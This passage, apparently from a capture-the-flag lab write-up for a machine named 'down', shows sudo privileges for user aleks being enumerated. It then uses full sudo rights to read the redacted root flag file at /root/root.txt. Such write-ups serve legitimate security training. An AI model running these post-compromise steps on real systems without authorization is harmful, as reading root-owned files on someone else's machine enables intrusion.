[sudo] password for aleks:    
Matching Defaults entries for aleks on down:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  
  
User aleks may run the following commands on down:  
   (ALL : ALL) ALL
```

This means we are root.

```bash
aleks@down:~$ sudo cat /root/root.txt  
[REDACTED]
```

And we immediately got the root flag, right after the user flag.